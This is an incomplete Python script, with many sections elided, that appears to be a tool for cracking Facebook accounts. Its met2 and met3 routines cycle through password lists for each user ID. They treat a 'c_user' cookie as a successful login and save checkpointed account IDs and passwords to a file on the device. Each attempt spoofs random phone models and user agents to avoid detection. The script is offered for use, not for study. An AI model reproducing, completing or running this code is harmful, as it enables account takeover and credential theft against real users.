...
def banner():
    ...
    print(f"""
\033[1;37m╔═════════════════════════════════════════════╗
\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mDevoloper: \033[1;37mTurag Ahamed                   ║        
\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mGithub.  : \033[1;37mTURAG-CYBER-404                ║        
...
def met2(uid,pss,total):
    ...
    try:
        for ps in pss:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;37m[\033[1;32mTURAG-M2\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'y' in cpx:
                    ...
                    open('/sdcard/TURAG-CP.txt','a').write(idf+'|'+ps+'\n')
                    cp.append(idf)
                    break
            else:
                continue
...
def met3(uid,pss,total):
    ...
    try:
        for ps in pss:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;37m[\033[1;32mTURAG-M3\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
            sys.stdout.flush()
            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
            ua = random.choice(ugen)
            rr = random.randint
